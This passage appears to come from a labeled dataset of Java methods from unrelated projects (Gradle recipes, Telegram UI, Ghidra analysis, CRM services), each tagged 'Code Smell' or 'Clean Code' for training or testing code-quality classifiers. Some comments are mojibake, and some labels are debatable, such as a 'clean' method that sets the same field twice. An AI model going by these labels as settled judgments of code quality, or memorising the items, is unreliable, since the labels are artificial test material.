,new TreeVisitor<Tree,ExecutionContext>(){
    @Override public boolean isAcceptable(    SourceFile sourceFile,    ExecutionContext ctx){
      if (!super.isAcceptable(sourceFile,ctx)) {
        return false;
      }
      if ((sourceFile instanceof Quark || sourceFile instanceof Remote) && equalIgnoringSeparators(sourceFile.getSourcePath(),WRAPPER_JAR_LOCATION)) {
        acc.addGradleWrapperJar=false;
        return true;
      }
      if (sourceFile instanceof PlainText) {
        if (equalIgnoringSeparators(sourceFile.getSourcePath(),WRAPPER_BATCH_LOCATION)) {
          acc.addGradleBatchScript=false;
          return true;
        }
 else         if (equalIgnoringSeparators(sourceFile.getSourcePath(),WRAPPER_SCRIPT_LOCATION)) {
          acc.addGradleShellScript=false;
          return true;
        }
      }
      return false;
    }
  }
);
}",1,Code Smell
"/** 
 * 灏唈ar鍖呴噷鐨勫姩鎬佸簱鍐欏叆鍒扮郴缁熺紦瀛樼洰褰�,浣跨敤缁濆璺緞鍔犺浇鍔ㄦ�佸簱
 * @param libName
 * @return
 */
private static String extractLibrary(String libName){
  return extractLibrary("""",libName);
}
/** 
 * 鐩稿璺緞鏂囦欢澶�
 * @param relativePath 鐩稿璺緞
 * @param libName 鍔ㄦ�佸簱璺緞
 * @return
 */
private static String extractLibrary(String relativePath,String libName){
  if (libName.trim().equals("""")) {
    return """";
  }
  String libFullName=getLibraryName(libName);
  String dir=getLibraryFold();
  if (!(relativePath.endsWith(""/"") || relativePath.endsWith(""\\""))) {
    relativePath=relativePath + ""/"";
  }
  String fileName=relativePath + dir + ""/""+ libFullName;
  InputStream in=LibraryLoad.class.getResourceAsStream(fileName);
  BufferedInputStream reader;
  FileOutputStream writer;
  File extractedLibFile=null;
  try {
    if (in == null) {
      in=new FileInputStream(fileName);
      if (in == null) {
        return """";
      }
    }
    String nativeTempDir=EXTRACT_PATH;
    if (!(nativeTempDir.endsWith(""/"") || nativeTempDir.endsWith(""\\""))) {
      nativeTempDir=nativeTempDir + ""/"";
    }
    extractedLibFile=new File(nativeTempDir + libFullName);
    reader=new BufferedInputStream(in);
    writer=new FileOutputStream(extractedLibFile);
    byte[] buffer=new byte[1024];
    while (true) {
      int len=reader.read(buffer);
      if (len == 0 || len == -1)       break;
      writer.write(buffer,0,len);
    }
    reader.close();
    writer.close();
    in.close();
  }
 catch (  Exception e) {
    System.out.println(""dynamic file[ "" + fileName + "" ] not found in project.please ensure you need this library."");
  }
  return extractedLibFile != null ? extractedLibFile.getAbsolutePath() : """";
}",1,Code Smell
"public void visit_CBRANCH(PcodeOp pcode,AbsEnv inOutEnv,AbsEnv tmpEnv){
  if (!isLastPcodeOfInstruction(pcode)) {
    Varnode target=pcode.getInput(0);
    Varnode condition=pcode.getInput(1);
    Address address=target.getAddress();
    if (!address.isLoadedMemoryAddress()) {
      return;
    }
    KSet conditionKSet=getKSet(condition,inOutEnv,tmpEnv,pcode);
    if (!conditionKSet.isFalse()) {
      AbsEnv oldEnv=context.getValueBefore(address);
      AbsEnv res=oldEnv.join(inOutEnv);
      if (res != null) {
        jumpOut=conditionKSet.isTrue();
        context.setValueBefore(address,res);
        context.insertToWorklist(address);
      }
    }
    return;
  }
  Address currentAddress=Utils.getAddress(pcode);
  Instruction fallThroughInstruction=GlobalState.flatAPI.getInstructionAfter(currentAddress);
  CFG cfg=CFG.getCFG(context.getFunction());
  if (fallThroughInstruction != null) {
    Address fallThoughAddress=fallThroughInstruction.getAddress();
    Varnode dst=pcode.getInput(0);
    assert (dst.getSpace() == GlobalState.flatAPI.getAddressFactory().getDefaultAddressSpace().getSpaceID());
    Address takenAddress=null;
    if (dst.isConstant()) {
      Logging.debug(""Skip relative offset into the indexed list of p-code operations"");
    }
 else     if (dst.isAddress()) {
      takenAddress=dst.getAddress();
    }
    cfg.addEdge(currentAddress,fallThoughAddress);
    cfg.addEdge(currentAddress,takenAddress);
  }
  cfg.refresh();
  isCBranch=true;
}",1,Code Smell
"@Override public void onAttachedToWindow(){
  super.onAttachedToWindow();
  if (springAnimation == null) {
    springAnimation=new SpringAnimation(this,ACTION_BAR_TRANSITION_PROGRESS_VALUE).setSpring(new SpringForce().setStiffness(1200f).setDampingRatio(SpringForce.DAMPING_RATIO_NO_BOUNCY)).addEndListener((animation,canceled,value,velocity) -> {
      ChatActivity chatActivity=parentEnterView.getParentFragment();
      ChatAvatarContainer chatAvatarContainer=chatActivity.getAvatarContainer();
      chatAvatarContainer.setClickable(value == 0);
      chatAvatarContainer.getAvatarImageView().setClickable(value == 0);
      ActionBar actionBar=chatActivity.getActionBar();
      if (value == 100 && parentEnterView.hasBotWebView()) {
        chatActivity.showHeaderItem(false);
        checkBotMenuItem();
        botMenuItem.setVisibility(VISIBLE);
        actionBar.setActionBarMenuOnItemClick(new ActionBar.ActionBarMenuOnItemClick(){
          @Override public void onItemClick(          int id){
            if (id == -1) {
              if (!webViewContainer.onBackPressed()) {
                onCheckDismissByUser();
              }
            }
 else             if (id == R.id.menu_reload_page) {
              if (webViewContainer.getWebView() != null) {
                webViewContainer.getWebView().animate().cancel();
                webViewContainer.getWebView().animate().alpha(0).start();
              }
              isLoaded=false;
              progressView.setLoadProgress(0);
              progressView.setAlpha(1f);
              progressView.setVisibility(VISIBLE);
              webViewContainer.setBotUser(MessagesController.getInstance(currentAccount).getUser(botId));
              webViewContainer.loadFlickerAndSettingsItem(currentAccount,botId,settingsItem);
              webViewContainer.reload();
            }
 else             if (id == R.id.menu_settings) {
              webViewContainer.onSettingsButtonPressed();
            }
          }
        }
);
      }
 else {
        chatActivity.showHeaderItem(true);
        if (botMenuItem != null) {
          botMenuItem.setVisibility(GONE);
        }
        actionBar.setActionBarMenuOnItemClick(actionBarOnItemClick);
      }
    }
);
  }
  NotificationCenter.getInstance(currentAccount).addObserver(this,NotificationCenter.webViewResultSent);
  NotificationCenter.getGlobalInstance().addObserver(this,NotificationCenter.didSetNewTheme);
}",1,Code Smell
"/** 
 * Determines if the class or interface represented by the specified node parameter is either the same as, or is a superclass or superinterface of, the class or interface represented by this node. It returns true if so;otherwise it returns  false. much like return this instanceof node
 */
public final boolean inheritFrom(final Node node){
  if (node == null)   return false;
  if (entity.name.equals(node.entity.name)) {
    return true;
  }
  final boolean isInterfaceNode=node instanceof InterfaceNode;
  final Queue<Node> interfaces=new LinkedList<>();
  if (isInterfaceNode && this.interfaces != null) {
    interfaces.addAll(this.interfaces);
  }
  Node parent=this.parent;
  while (parent != null) {
    if (isInterfaceNode) {
      interfaces.addAll(parent.interfaces);
    }
 else {
      if (node.entity.name.equals(parent.entity.name)) {
        return true;
      }
    }
    parent=parent.parent;
  }
  while (!interfaces.isEmpty()) {
    Node aInterface=interfaces.poll();
    if (node.entity.name.equals(aInterface.entity.name)) {
      return true;
    }
    if (aInterface.interfaces != null) {
      interfaces.addAll(aInterface.interfaces);
    }
  }
  return false;
}
",1,Code Smell
"private void positionMarker(){
  if (parentAlert.isStoryLocationPicker) {
    if (parentAlert.storyLocationPickerLatLong != null) {
      AndroidUtilities.runOnUIThread(() -> resetMapPosition(parentAlert.storyLocationPickerLatLong[0],parentAlert.storyLocationPickerLatLong[1]));
    }
 else     if (!locationDenied) {
      boolean reset=true;
      final File file=parentAlert.storyLocationPickerPhotoFile;
      final boolean isVideo=parentAlert.storyLocationPickerFileIsVideo;
      if (file != null) {
        try {
          if (isVideo) {
            MediaMetadataRetriever mediaMetadataRetriever=new MediaMetadataRetriever();
            mediaMetadataRetriever.setDataSource(file.getAbsolutePath());
            String location=mediaMetadataRetriever.extractMetadata(MediaMetadataRetriever.METADATA_KEY_LOCATION);
            if (location != null) {
              Matcher m=Pattern.compile(""([+\\-][0-9.]+)([+\\-][0-9.]+)"").matcher(location);
              if (m.find() && m.groupCount() == 2) {
                String latstr=m.group(1);
                String lonstr=m.group(2);
                try {
                  double lat=Double.parseDouble(latstr);
                  double lon=Double.parseDouble(lonstr);
                  AndroidUtilities.runOnUIThread(() -> resetMapPosition(lat,lon));
                  reset=false;
                }
 catch (                NumberFormatException ignored) {
                }
              }
            }
          }
 else {
            ExifInterface ei=new ExifInterface(file.getAbsolutePath());
            float[] latlong=new float[2];
            if (ei.getLatLong(latlong)) {
              AndroidUtilities.runOnUIThread(() -> resetMapPosition(latlong[0],latlong[1]));
              reset=false;
            }
          }
        }
 catch (        Exception e) {
        }
      }
      if (reset) {
        positionMarker(myLocation=getLastLocation());
      }
    }
 else {
      AndroidUtilities.runOnUIThread(() -> resetMapPosition(0,0));
    }
  }
 else {
    positionMarker(myLocation=getLastLocation());
  }
}
private void positionMarker(Location location){
  if (location == null) {
    return;
  }
  myLocation=new Location(location);
  if (map != null) {
    IMapsProvider.LatLng latLng=new IMapsProvider.LatLng(location.getLatitude(),location.getLongitude());
    if (adapter != null) {
      if (!searchedForCustomLocations && locationType != LOCATION_TYPE_BIZ) {
        adapter.searchPlacesWithQuery(null,myLocation,true);
      }
      adapter.setGpsLocation(myLocation);
    }
    if (!userLocationMoved) {
      userLocation=new Location(location);
      if (firstWas) {
        IMapsProvider.ICameraUpdate position=ApplicationLoader.getMapsProvider().newCameraUpdateLatLng(latLng);
        map.animateCamera(position);
      }
 else {
        firstWas=true;
        IMapsProvider.ICameraUpdate position=ApplicationLoader.getMapsProvider().newCameraUpdateLatLngZoom(latLng,map.getMaxZoomLevel() - 4);
        map.moveCamera(position);
      }
    }
  }
 else {
    adapter.setGpsLocation(myLocation);
  }
}",1,Code Smell
"@Override @Transactional(rollbackFor=Exception.class) public void removeTeamMember(TeamMemberRemoveBO memberRemoveBO){
  if (CollUtil.isEmpty(memberRemoveBO.getMemberIds())) {
    return;
  }
  if (CollUtil.isEmpty(memberRemoveBO.getMemberIds())) {
    return;
  }
  if (ObjectUtil.isNull(memberRemoveBO.getModuleId())) {
    throw new BusinessException(ModuleCodeEnum.MODULE_ID_IS_NULL_ERROR);
  }
  if (ObjectUtil.isNull(memberRemoveBO.getDataId())) {
    throw new BusinessException(ModuleCodeEnum.DATA_ID_IS_NULL);
  }
  ModuleFieldDataCommon dataCommon=dataCommonService.getByDataId(memberRemoveBO.getDataId());
  if (memberRemoveBO.getMemberIds().contains(dataCommon.getOwnerUserId())) {
    throw new BusinessException(ModuleCodeEnum.TEAM_OWNER_CAN_NOT_BE_REMOVED);
  }
  ModuleEntity module=moduleService.getByModuleIdAndVersion(memberRemoveBO.getModuleId(),dataCommon.getVersion());
  String mainFieldValue=fieldDataProvider.queryValue(memberRemoveBO.getDataId(),module.getMainFieldId());
  lambdaUpdate().eq(ModuleTeamMember::getModuleId,memberRemoveBO.getModuleId()).eq(ModuleTeamMember::getDataId,memberRemoveBO.getDataId()).in(ModuleTeamMember::getUserId,memberRemoveBO.getMemberIds()).remove();
  List<ModuleDataOperationRecord> operationRecords=new ArrayList<>();
  for (  Long memberId : memberRemoveBO.getMemberIds()) {
    operationRecords.add(operationRecordService.initTeamUserEntity(module.getModuleId(),module.getVersion(),memberRemoveBO.getDataId(),mainFieldValue,memberId,ActionTypeEnum.REMOVE_TEAM_MEMBER));
  }
  MessageBO messageBO=new MessageBO();
  messageBO.setDataId(memberRemoveBO.getDataId());
  String msgValue="""";
  if (ObjectUtil.equal(1,memberRemoveBO.getMemberIds().size()) && ObjectUtil.equal(UserUtil.getUserId(),memberRemoveBO.getMemberIds().get(0))) {
    msgValue=""鎮ㄥ凡閫�鍑�"" + module.getName();
  }
 else {
    msgValue=""鎮ㄥ凡琚�"" + UserUtil.getUser().getNickname() + ""绉诲嚭""+ module.getName();
  }
  messageBO.setValue(msgValue);
  messageBO.setModuleId(module.getModuleId());
  messageBO.setModuleName(module.getName());
  messageBO.setTypeId(0L);
  messageBO.setTypeName(mainFieldValue);
  messageBO.setExtData(null);
  messageBO.setType(4);
  messageBO.setReceivers(memberRemoveBO.getMemberIds());
  messageBO.setCreateUserId(UserUtil.getUserId());
  ApplicationContextHolder.getBean(IMessageService.class).sendMessage(messageBO);
  operationRecordService.saveBatch(operationRecords);
  List<ModuleTeamMember> teamMembers=this.getTeamMemberByDataId(dataCommon.getModuleId(),dataCommon.getDataId());
  List<Long> memberIds=teamMembers.stream().map(ModuleTeamMember::getUserId).collect(Collectors.toList());
  dataCommon.setTeamMember(JSON.toJSONString(memberIds));
  dataCommon.setUpdateTime(DateUtil.date());
  dataCommonService.updateById(dataCommon);
  Map<String,Object> fieldValueMap=new HashMap<>(1);
  fieldValueMap.put(""teamMember"",memberIds);
  updateField(fieldValueMap,dataCommon.getDataId(),dataCommon.getModuleId());
}",1,Code Smell
"public static int maxCoins2(int[] arr){
  if (arr == null || arr.length == 0) {
    return 0;
  }
  if (arr.length == 1) {
    return arr[0];
  }
  int N=arr.length;
  int[] help=new int[N + 2];
  help[0]=1;
  help[N + 1]=1;
  for (int i=0; i < N; i++) {
    help[i + 1]=arr[i];
  }
  int[][] dp=new int[N + 2][N + 2];
  for (int i=1; i <= N; i++) {
    dp[i][i]=help[i - 1] * help[i] * help[i + 1];
  }
  for (int L=N; L >= 1; L--) {
    for (int R=L + 1; R <= N; R++) {
      int ans=help[L - 1] * help[L] * help[R + 1] + dp[L + 1][R];
      ans=Math.max(ans,help[L - 1] * help[R] * help[R + 1] + dp[L][R - 1]);
      for (int i=L + 1; i < R; i++) {
        ans=Math.max(ans,help[L - 1] * help[i] * help[R + 1] + dp[L][i - 1] + dp[i + 1][R]);
      }
      dp[L][R]=ans;
    }
  }
  return dp[1][N];
}",1,Code Smell
"@Override public G.CompilationUnit visitCompilationUnit(G.CompilationUnit cu,ExecutionContext ctx){
  Optional<BuildTool> maybeBuildTool=cu.getMarkers().findFirst(BuildTool.class);
  if (!maybeBuildTool.isPresent()) {
    return cu;
  }
  BuildTool buildTool=maybeBuildTool.get();
  if (buildTool.getType() != BuildTool.Type.Gradle) {
    return cu;
  }
  VersionComparator versionComparator=Semver.validate(""(,6)"",null).getValue();
  if (versionComparator == null) {
    return cu;
  }
  if (containsGradleEnterpriseDsl(cu)) {
    return cu;
  }
  boolean gradleSixOrLater=versionComparator.compare(null,buildTool.getVersion(),""6.0"") >= 0;
  if (gradleSixOrLater && cu.getSourcePath().endsWith(""settings.gradle"")) {
    Optional<GradleSettings> maybeGradleSettings=cu.getMarkers().findFirst(GradleSettings.class);
    if (!maybeGradleSettings.isPresent()) {
      return cu;
    }
    GradleSettings gradleSettings=maybeGradleSettings.get();
    cu=withPlugin(cu,""com.gradle.enterprise"",versionComparator,null,gradleSettings,ctx);
  }
 else   if (!gradleSixOrLater && cu.getSourcePath().toString().equals(""build.gradle"")) {
    Optional<GradleProject> maybeGradleProject=cu.getMarkers().findFirst(GradleProject.class);
    if (!maybeGradleProject.isPresent()) {
      return cu;
    }
    GradleProject gradleProject=maybeGradleProject.get();
    cu=withPlugin(cu,""com.gradle.build-scan"",versionComparator,gradleProject,null,ctx);
  }
  return cu;
}",1,Code Smell
"private static byte[] getDataFromImage(Image image,int colorFormat){
  if (colorFormat != COLOR_FormatI420 && colorFormat != COLOR_FormatNV21) {
    throw new IllegalArgumentException(""only support COLOR_FormatI420 "" + ""and COLOR_FormatNV21"");
  }
  if (!isImageFormatSupported(image)) {
    throw new RuntimeException(""can't convert Image to byte array, format "" + image.getFormat());
  }
  Rect crop=image.getCropRect();
  int format=image.getFormat();
  int width=crop.width();
  int height=crop.height();
  Image.Plane[] planes=image.getPlanes();
  byte[] data=new byte[width * height * ImageFormat.getBitsPerPixel(format) / 8];
  byte[] rowData=new byte[planes[0].getRowStride()];
  if (VERBOSE)   Log.v(TAG,""get data from "" + planes.length + "" planes"");
  int channelOffset=0;
  int outputStride=1;
  for (int i=0; i < planes.length; i++) {
switch (i) {
case 0:
      channelOffset=0;
    outputStride=1;
  break;
case 1:
if (colorFormat == COLOR_FormatI420) {
  channelOffset=width * height;
  outputStride=1;
}
 else if (colorFormat == COLOR_FormatNV21) {
  channelOffset=width * height + 1;
  outputStride=2;
}
break;
case 2:
if (colorFormat == COLOR_FormatI420) {
channelOffset=(int)(width * height * 1.25);
outputStride=1;
}
 else if (colorFormat == COLOR_FormatNV21) {
channelOffset=width * height;
outputStride=2;
}
break;
}
ByteBuffer buffer=planes[i].getBuffer();
int rowStride=planes[i].getRowStride();
int pixelStride=planes[i].getPixelStride();
if (VERBOSE) {
Log.v(TAG,""pixelStride "" + pixelStride);
Log.v(TAG,""rowStride "" + rowStride);
Log.v(TAG,""width "" + width);
Log.v(TAG,""height "" + height);
Log.v(TAG,""buffer size "" + buffer.remaining());
}
int shift=(i == 0) ? 0 : 1;
int w=width >> shift;
int h=height >> shift;
buffer.position(rowStride * (crop.top >> shift) + pixelStride * (crop.left >> shift));
for (int row=0; row < h; row++) {
int length;
if (pixelStride == 1 && outputStride == 1) {
length=w;
buffer.get(data,channelOffset,length);
channelOffset+=length;
}
 else {
length=(w - 1) * pixelStride + 1;
buffer.get(rowData,0,length);
for (int col=0; col < w; col++) {
data[channelOffset]=rowData[col * pixelStride];
channelOffset+=outputStride;
}
}
if (row < h - 1) {
buffer.position(buffer.position() + rowStride - length);
}
}
if (VERBOSE) Log.v(TAG,""Finished reading data from plane "" + i);
}
return data;
}",1,Code Smell
"void doReloadUninitializedMainDictionaries(final Context context,final List<Locale> locales,final DictionaryInitializationListener listener,final CountDownLatch latchForWaitingLoadingMainDictionary){
  final Dictionary[] mainDicts=new Dictionary[locales.size()];
  final ArrayList<DictionaryGroup> dictionaryGroups=new ArrayList<>();
  for (int i=0; i < locales.size(); i++) {
    Locale locale=locales.get(i);
    DictionaryGroup dictionaryGroup=findDictionaryGroupWithLocale(mDictionaryGroups,locale);
    if (null == dictionaryGroup) {
      Log.w(TAG,""Expected a dictionary group for "" + locale + "" but none found"");
      return;
    }
    dictionaryGroups.add(dictionaryGroup);
    if (dictionaryGroup.mMainDict != null && dictionaryGroup.mMainDict.isInitialized()) {
      mainDicts[i]=null;
      continue;
    }
    mainDicts[i]=DictionaryFactoryKt.createMainDictionary(context,dictionaryGroup.mLocale);
  }
synchronized (mLock) {
    for (int i=0; i < locales.size(); i++) {
      final Locale locale=locales.get(i);
      if (mainDicts[i] == null)       continue;
      if (locale.equals(dictionaryGroups.get(i).mLocale)) {
        dictionaryGroups.get(i).setMainDict(mainDicts[i]);
      }
 else {
        mainDicts[i].close();
      }
    }
  }
  if (listener != null) {
    listener.onUpdateMainDictionaryAvailability(hasAtLeastOneInitializedMainDictionary());
  }
  latchForWaitingLoadingMainDictionary.countDown();
}",1,Code Smell
"public boolean matchJson(String requestJson){
  String jsonStr=jsonBody.getJsonValue();
  if (StringUtils.startsWith(requestJson,""{"") && StringUtils.endsWith(requestJson,""}"")) {
    if (StringUtils.startsWith(jsonStr,""{"") && StringUtils.endsWith(jsonStr,""}"")) {
      Map<String,Object> mockMap=JSON.parseMap(jsonStr);
      Map<String,Object> requestMap=JSON.parseMap(requestJson);
      return this.matchObject(mockMap,requestMap);
    }
 else {
      return false;
    }
  }
  if (StringUtils.startsWith(requestJson,""["") && StringUtils.endsWith(requestJson,""]"")) {
    List<Object> requestList=JSON.parseArray(requestJson,Object.class);
    if (StringUtils.startsWith(jsonStr,""{"") && StringUtils.endsWith(jsonStr,""}"")) {
      Map<String,Object> mockMap=JSON.parseMap(jsonStr);
      for (      Object requestObj : requestList) {
        if (this.matchObject(mockMap,requestObj)) {
          return true;
        }
      }
      return false;
    }
 else     if (StringUtils.startsWith(jsonStr,""["") && StringUtils.endsWith(jsonStr,""]"")) {
      List<Object> mockList=JSON.parseArray(requestJson,Object.class);
      for (      Object mockObj : mockList) {
        boolean match=false;
        for (int i=0; i < requestList.size(); i++) {
          Object requestObj=requestList.get(i);
          match=this.matchObject(mockObj,requestObj);
          if (match) {
            requestList.remove(i);
            break;
          }
        }
        if (!match) {
          return false;
        }
      }
      return true;
    }
    return false;
  }
  return false;
}",1,Code Smell
"public String toString(){
  return ""JsonSchemaProperty{key="" + this.key + "", value=""+ this.value+ ""}"";
}
",0,Clean Code
"/** 
 * @author
 */
@Overwrite public void apply(){
  if (!this.isLegacy)   return;
  if (this.MODEL_VIEW_MATRIX != null) {
    this.MODEL_VIEW_MATRIX.set(RenderSystem.getModelViewMatrix());
  }
  if (this.PROJECTION_MATRIX != null) {
    this.PROJECTION_MATRIX.set(RenderSystem.getProjectionMatrix());
  }
  if (this.COLOR_MODULATOR != null) {
    this.COLOR_MODULATOR.set(RenderSystem.getShaderColor());
  }
  if (this.INVERSE_VIEW_ROTATION_MATRIX != null) {
    this.INVERSE_VIEW_ROTATION_MATRIX.set(RenderSystem.getInverseViewRotationMatrix());
  }
  if (this.COLOR_MODULATOR != null) {
    this.COLOR_MODULATOR.set(RenderSystem.getShaderColor());
  }
  if (this.GLINT_ALPHA != null) {
    this.GLINT_ALPHA.set(RenderSystem.getShaderGlintAlpha());
  }
  if (this.FOG_START != null) {
    this.FOG_START.set(RenderSystem.getShaderFogStart());
  }
  if (this.FOG_END != null) {
    this.FOG_END.set(RenderSystem.getShaderFogEnd());
  }
  if (this.FOG_COLOR != null) {
    this.FOG_COLOR.set(RenderSystem.getShaderFogColor());
  }
  if (this.FOG_SHAPE != null) {
    this.FOG_SHAPE.set(RenderSystem.getShaderFogShape().getIndex());
  }
  if (this.TEXTURE_MATRIX != null) {
    this.TEXTURE_MATRIX.set(RenderSystem.getTextureMatrix());
  }
  if (this.GAME_TIME != null) {
    this.GAME_TIME.set(RenderSystem.getShaderGameTime());
  }
  if (this.SCREEN_SIZE != null) {
    Window window=Minecraft.getInstance().getWindow();
    this.SCREEN_SIZE.set((float)window.getWidth(),(float)window.getHeight());
  }
  if (this.LINE_WIDTH != null) {
    this.LINE_WIDTH.set(RenderSystem.getShaderLineWidth());
  }
}
",0,Clean Code
"public Builder embeddings(List<float[]> embeddings){
  if (embeddings != null) {
    this.embeddings=embeddings;
  }
  return this;
}
",0,Clean Code
"private static void onShutdown(){
  if (gameServer != null) {
    gameServer.onShutdown();
  }
  if (pluginManager != null) {
    pluginManager.disablePlugins();
  }
}
",0,Clean Code
"@Override public String getTipMsg(){
  return this.mInfo.getTipMsg();
}
",0,Clean Code
"public static List<String> getRsHeader(ResultSet rs){
  try {
    ResultSetMetaData resultSetMetaData=rs.getMetaData();
    int col=resultSetMetaData.getColumnCount();
    List<String> headerList=Lists.newArrayListWithExpectedSize(col);
    for (int i=1; i <= col; i++) {
      headerList.add(getColumnName(resultSetMetaData,i));
    }
    return headerList;
  }
 catch (  SQLException e) {
    throw new RuntimeException(e);
  }
}",0,Clean Code
"/** 
 * <code>optional string display_name = 5;</code>
 * @return internal {@code Utf8String} representation of displayName for modifications
 */
public Utf8String getMutableDisplayNameBytes(){
  bitField0_|=0x00000010;
  return this.displayName;
}",0,Clean Code
"boolean isQQMsgListChannel(@NotNull String str,@NotNull String str2);",0,Clean Code
"/** 
 * @return factory for creating PlayerBasicInfo messages
 */
public static MessageFactory<PlayerBasicInfo> getFactory(){
  return PlayerBasicInfoFactory.INSTANCE;
}
",0,Clean Code
"public ZyLineContent(final String text,final Font font,final IZyEditableObject model){
  this(text,font,new ArrayList<CStyleRunData>(),model);
}
public ZyLineContent(final String text,final Font font,final List<CStyleRunData> textColorStyleRun,final IZyEditableObject model){
  Preconditions.checkNotNull(text,""Error: Text argument can't be null"");
  Preconditions.checkNotNull(textColorStyleRun,""Error: Text color style run can't be null."");
  m_model=model;
  regenerateLine(text,font,textColorStyleRun);
}
public ZyLineContent(final String text,final IZyEditableObject model){
  this(text,null,model);
}
",0,Clean Code
"/** 
 * <code>optional uint32 base_avatar_id = 8;</code>
 * @return this
 */
public TakePromotionRewardCsReq clearBaseAvatarId(){
  bitField0_&=~0x00000002;
  baseAvatarId=0;
  return this;
}",0,Clean Code
"/** 
 * @return the parentWorkflowId
 */
public String getParentWorkflowId(){
  return parentWorkflowId;
}
",0,Clean Code
"/** 
 * This is responsible for managing the  {@link BorderPane} when the {@link MFXLabeled#contentDispositionProperty()}and the  {@link MFXLabeled#gapProperty()} change.<p> Note that the gap is set by using  {@link BorderPane#setMargin(Node,Insets)} on the text node.
 */
protected void initContainer(){
  C labeled=getSkinnable();
  Pane controlContainer=getControlContainer();
  ContentDisplay disposition=labeled.getContentDisposition();
  double gap=labeled.getGap();
  topContainer.getChildren().clear();
  topContainer.setCenter(text);
switch (disposition) {
case TOP:
{
      topContainer.setTop(controlContainer);
      BorderPane.setMargin(text,InsetsFactory.top(gap));
      break;
    }
case RIGHT:
{
    topContainer.setRight(controlContainer);
    BorderPane.setMargin(text,InsetsFactory.right(gap));
    break;
  }
case BOTTOM:
{
  topContainer.setBottom(controlContainer);
  BorderPane.setMargin(text,InsetsFactory.bottom(gap));
  break;
}
case TEXT_ONLY:
case LEFT:
{
topContainer.setLeft(controlContainer);
BorderPane.setMargin(text,InsetsFactory.left(gap));
break;
}
case GRAPHIC_ONLY:
case CENTER:
{
topContainer.setCenter(controlContainer);
BorderPane.setMargin(text,InsetsFactory.none());
break;
}
}
}
",0,Clean Code
"@Override public boolean equals(Object o){
  if (this == o)   return true;
  if (o == null || getClass() != o.getClass())   return false;
  User user=(User)o;
  if (following != user.following)   return false;
  if (followerCount != user.followerCount)   return false;
  if (verified != user.verified)   return false;
  if (twitterId != user.twitterId)   return false;
  if (twitterConnected != user.twitterConnected)   return false;
  if (likeCount != user.likeCount)   return false;
  if (facebookConnected != user.facebookConnected)   return false;
  if (postCount != user.postCount)   return false;
  if (followingCount != user.followingCount)   return false;
  if (username != null ? !username.equals(user.username) : user.username != null)   return false;
  if (description != null ? !description.equals(user.description) : user.description != null)   return false;
  if (avatarUrl != null ? !avatarUrl.equals(user.avatarUrl) : user.avatarUrl != null)   return false;
  if (userId != null ? !userId.equals(user.userId) : user.userId != null)   return false;
  if (phoneNumber != null ? !phoneNumber.equals(user.phoneNumber) : user.phoneNumber != null)   return false;
  if (location != null ? !location.equals(user.location) : user.location != null)   return false;
  if (email != null ? !email.equals(user.email) : user.email != null)   return false;
  return !(error != null ? !error.equals(user.error) : user.error != null);
}
",0,Clean Code
"public RawCombinedFunction getCombinedFunction(){
  return (RawCombinedFunction)combinedDiffNode.getRawNode();
}
",0,Clean Code
"/** 
 * <code>optional .SceneInfo scene = 3;</code>
 * @return whether the scene field is set
 */
public boolean hasScene(){
  return (bitField0_ & 0x00000002) != 0;
}",0,Clean Code
"void initPlayerCfg(){
  try {
    mVodPlayerCfg=new JSONObject(mVodInfo.playerCfg);
  }
 catch (  Throwable th) {
    mVodPlayerCfg=new JSONObject();
  }
  try {
    if (!mVodPlayerCfg.has(""pl"")) {
      mVodPlayerCfg.put(""pl"",Hawk.get(HawkConfig.PLAY_TYPE,1));
    }
    if (!mVodPlayerCfg.has(""pr"")) {
      mVodPlayerCfg.put(""pr"",Hawk.get(HawkConfig.PLAY_RENDER,0));
    }
    if (!mVodPlayerCfg.has(""ijk"")) {
      mVodPlayerCfg.put(""ijk"",Hawk.get(HawkConfig.IJK_CODEC,""""));
    }
    if (!mVodPlayerCfg.has(""sc"")) {
      mVodPlayerCfg.put(""sc"",Hawk.get(HawkConfig.PLAY_SCALE,0));
    }
    if (!mVodPlayerCfg.has(""sp"")) {
      mVodPlayerCfg.put(""sp"",1.0f);
    }
    if (!mVodPlayerCfg.has(""st"")) {
      mVodPlayerCfg.put(""st"",0);
    }
    if (!mVodPlayerCfg.has(""et"")) {
      mVodPlayerCfg.put(""et"",0);
    }
  }
 catch (  Throwable th) {
  }
  mController.setPlayerConfig(mVodPlayerCfg);
}",0,Clean Code
"public GProCreateLobbyRsp(){
  this.lobbyRoomInfo=new GProLobbyRoomInfo();
}
public GProCreateLobbyRsp(GProLobbyRoomInfo gProLobbyRoomInfo){
  this.lobbyRoomInfo=new GProLobbyRoomInfo();
  this.lobbyRoomInfo=gProLobbyRoomInfo;
}
",0,Clean Code
"public static AlertDialog showSecretLocationAlert(Context context,int currentAccount,final Runnable onSelectRunnable,boolean inChat,Theme.ResourcesProvider resourcesProvider){
  ArrayList<String> arrayList=new ArrayList<>();
  ArrayList<Integer> types=new ArrayList<>();
  int providers=5;
  if ((providers & 1) != 0) {
    arrayList.add(LocaleController.getString(""MapPreviewProviderTelegram"",R.string.MapPreviewProviderTelegram));
    types.add(0);
  }
  if ((providers & 2) != 0) {
    arrayList.add(LocaleController.getString(""MapPreviewProviderGoogle"",R.string.MapPreviewProviderGoogle));
    types.add(1);
  }
  if ((providers & 4) != 0) {
    arrayList.add(LocaleController.getString(""MapPreviewProviderYandex"",R.string.MapPreviewProviderYandex));
    types.add(3);
  }
  arrayList.add(LocaleController.getString(""MapPreviewProviderNobody"",R.string.MapPreviewProviderNobody));
  types.add(2);
  AlertDialog.Builder builder=new AlertDialog.Builder(context,resourcesProvider);
  builder.setTitle(LocaleController.getString(""MapPreviewProviderTitle"",R.string.MapPreviewProviderTitle));
  final LinearLayout linearLayout=new LinearLayout(context);
  linearLayout.setOrientation(LinearLayout.VERTICAL);
  builder.setView(linearLayout);
  for (int a=0; a < arrayList.size(); a++) {
    RadioColorCell cell=new RadioColorCell(context,resourcesProvider);
    cell.setPadding(dp(4),0,dp(4),0);
    cell.setTag(a);
    cell.setCheckColor(Theme.getColor(Theme.key_radioBackground),Theme.getColor(Theme.key_dialogRadioBackgroundChecked));
    cell.setTextAndValue(arrayList.get(a),SharedConfig.mapPreviewType == types.get(a));
    cell.setBackground(Theme.createSelectorDrawable(Theme.getColor(Theme.key_listSelector),Theme.RIPPLE_MASK_ALL));
    linearLayout.addView(cell);
    cell.setOnClickListener(v -> {
      Integer which=(Integer)v.getTag();
      SharedConfig.setSecretMapPreviewType(types.get(which));
      if (onSelectRunnable != null) {
        onSelectRunnable.run();
      }
      builder.getDismissRunnable().run();
    }
);
  }
  if (!inChat) {
